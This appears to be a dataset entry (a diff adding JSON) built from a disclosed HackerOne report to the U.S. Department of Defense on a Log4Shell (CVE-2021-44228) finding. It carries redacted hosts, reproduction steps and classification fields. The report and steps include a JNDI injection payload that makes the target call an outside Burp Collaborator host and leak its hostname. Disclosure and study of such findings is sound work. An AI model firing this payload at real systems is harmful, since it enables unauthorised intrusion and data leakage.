@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "ferreiraklet_ ",
+  "title": "LOGJ4 VUlnerability [HtUS]",
+  "content": "\nDescription:\nHi team,\nlog4 shell is recent 0-day exploit it's Java package vulnerable. \u2588\u2588\u2588\u2588\u2588 is vulnerable\nImpact\nRCE\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2021-44228\nSteps to Reproduce\nGo to this url => https://\u2588\u2588\u2588\u2588\u2588/?x=${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}\npaste the poc code on parameter\nThen burp collaborator received reverse ping back Photos below\nPOC CODE\n${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}\nSuggested Mitigation/Remediation Actions\nhttps://www.lunasec.io/docs/blog/log4j-zero-day/\nImpact\nSuccessful attack leads Arbitary Code Execution on the application\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1668812820,
+  "report_url": "https://hackerone.com/reports/1624137",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Go to the vulnerable URL: https://\u2588\u2588\u2588\u2588\u2588/?x=${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}"
+    ],
+    [
+      2,
+      "Paste the POC code into the parameter and observe the reverse ping back in Burp Collaborator"
+    ]
+  ],
+  "vuln_description": "This vulnerability involves the Log4j library (CVE-2021-44228), which allows Remote Code Execution (RCE) via a crafted JNDI lookup in the log message. The attacker can exploit this by sending a specially crafted request to a vulnerable application, which then executes arbitrary code.",
+  "reason": "The attack is straightforward and involves a single, well-documented exploit (Log4Shell). The steps to reproduce are simple and do not require understanding complex interactions or manipulating application states. The exploit is widely known and does not involve novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The Log4j vulnerability (CVE-2021-44228) involves a Remote Code Execution (RCE) exploit via a Java package (Log4j) and does not directly involve authentication or authorization bypass within the same application context. The proposed methodologies focus on detecting AuthN/AuthZ and IDOR vulnerabilities by manipulating user sessions, actions, and resource IDs within the same application. Since the Log4j exploit is unrelated to these scenarios, it would not be detectable using the described methodologies.",
+    "is_detectable": false
+  }
+}
